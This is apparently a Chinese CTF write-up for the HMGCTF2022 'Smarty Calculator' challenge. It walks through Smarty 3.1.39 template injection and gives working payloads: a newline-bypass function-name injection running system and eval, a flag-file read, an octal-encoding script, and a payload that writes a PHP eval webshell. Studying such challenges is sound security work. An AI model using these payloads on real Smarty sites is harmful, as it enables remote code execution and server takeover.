---
title: '[HMGCTF2022]Smarty Calculator'
date: 2024-11-22 19:08:01
tags: ssti
categories: 刷题笔记
---

### [HMGCTF2022]Smarty Calculator

打开页面，我们看到一个提交框

![image-20241122200044835](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411222000955.png)

长这样，一看就像个ssti注入

我们输入

```
{{7*7}}
```

页面弹出个没有登录，我吧网页翻遍了也没看见哪里要登录

于是扫了一下文件，发现有个www.zip

![](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411222002141.png)

```php
<?php
error_reporting(0);
include_once('./Smarty/Smarty.class.php');
$smarty = new Smarty();
$my_security_policy = new Smarty_Security($smarty);
$my_security_policy->php_functions = null;
$my_security_policy->php_handling = Smarty::PHP_REMOVE;
$my_security_policy->php_modifiers = null;
$my_security_policy->static_classes = null;
$my_security_policy->allow_super_globals = false;
$my_security_policy->allow_constants = false;
$my_security_policy->allow_php_tag = false;
$my_security_policy->streams = null;
$my_security_policy->php_modifiers = null;
$smarty->enableSecurity($my_security_policy);

function waf($data){
  $pattern = "php|\<|flag|\?";
  $vpattern = explode("|", $pattern);
  foreach ($vpattern as $value) {
        if (preg_match("/$value/", $data)) {
         echo("<div style='width:100%;text-align:center'><h5>Calculator don  not like U<h5><br>");
          die();
        }
    }
    return $data;
}

if(isset($_POST['data'])){
  if(isset($_COOKIE['login'])) {
      $data = waf($_POST['data']);
      echo "<div style='width:100%;text-align:center'><h5>Only smarty people can use calculators:<h5><br>";
      $smarty->display("string:" . $data);
  }else{
      echo "<script>alert(\"你还没有登录\")</script>";
  }
}
```

通过代码审计，我们发现登录需要在cookie里传个login，并且对post方法传的data进行了waf过滤，过滤了php < flag ?

同时，我们在Smarty.class.php里找到了smarty的版本 3.1.39

![image-20241122200837741](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411222008794.png)

### 思路一

https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html

通过查询发现smarty的3.1.39有一个漏洞

![img](https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815180335796.png)

从官方下载对应版本：https://github.com/smarty-php/smarty/releases?q=3.1.39&expanded=true

对比发现`smarty_internal_compile_function.php`有改动（此处对比工具为`Beyond Compare`）

![img](https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815103521724.png)

关键的差异只有一处正则（左侧为题目源码，右侧为官方源码）

![img](https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815103852608.png)

```
preg_match('/[a-zA-Z0-9_\x80-\xff](.*)+$/', $_name)
```

题目正则逻辑分析：

1. `[a-zA-Z0-9_\x80-\xff]`匹配字母、数字、下划线或0x80-0xff范围内的任意字节，作为开头字符。
2. `(.*)+`匹配0次或多次(*)任意数量(+)除换行符\n之外的任意单字符(.)。
3. $匹配字符串的结束。

其中正则里`\x80-\xff`表示匹配utf-8编码下所有的汉字

所以可以换行绕过，`%0A`既不在前面的`[]`匹配里面，又不被后面的`.`匹配

所以只需要在原来poc基础上，加上`%0A`绕过即可（实际测试发现需要两个字符，且只要第一个字符是`%0A`皆可，此处用`%0A%0A`）

```none
data={function+name='rce(){};system("id");function%0A%0A'}{/function}
```

HackBar传参如下

![img](https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815182749317.png)

执行phpinfo()

```
data={function+name='rce(){};@eval($_POST[1]);function%0A%0A'}{/function}&1=phpinfo();
```

![img](https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815183401988.png)

读flag

```
data={function+name='rce(){};@eval($_POST[1]);function%0A%0A'}{/function}&1=var_dump(file_get_contents('/flag'));
```

![img](https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815184109598.png)

### 思路二

function.math.php文件里有eval()函数可以命令执行，回溯$equation变量有这个正则匹配

![img](https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815140049432.png)

```
preg_match_all('!(?:0x[a-fA-F0-9]+)|([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)!', $equation, $match);

```

正则逻辑分析如下：

1. `preg_match_all()`函数使用正则表达式匹配`$equation`字符串；
2. 模式使用`! !`作为定界符；
3. 第一部分 `(?:0x[a-fA-F0-9]+)` 匹配十六进制数，`?:`表示不捕获；
4. 第二部分`([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)`捕获变量名模式（以字母/下划线/0x7f-0xff范围内的字符开头，后跟0个或多个字母/数字/指定字符的模式）。
5. `|`表示或，匹配两种模式之一。
6. 结果存储在$match数组中。
7. 第一部分不捕获，第二部分捕获的变量名存入 $match[1]。
8. 这样可以检索出字符串中的变量名，进行后续处理。

根据上述逻辑，此处可通过八进制绕过正则

脚本如下

```
s = input("请输入字符串:")

res = ""
for c in s:
    if c == "(" or c == ")" or c == ",":
        res += c
    elif c == "\"":
        res += "\\" + c
    else:
        o = oct(ord(c))
        res += "\\\\" + o[2:]
        
print(res)
```

如下命令写入一句话木马

```
("file_put_contents")("wa0er.php","<?php eval($_POST[wa0er]);?>")
```

我们将其处理成八进制后，完整payload如下

```
data={$poc="poc"}{math equation="(\"\\146\\151\\154\\145\\137\\160\\165\\164\\137\\143\\157\\156\\164\\145\\156\\164\\163\")(\"\\167\\141\\60\\145\\162\\56\\160\\150\\160\",\"\\74\\77\\160\\150\\160\\40\\145\\166\\141\\154(\\44\\137\\120\\117\\123\\124\\133\\167\\141\\60\\145\\162\\135)\\73\\77\\76\")"}

```

上传后我们访问wa0er.php

用蚁剑进行连接，得到flag

![image-20241122205104335](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411222051486.png)
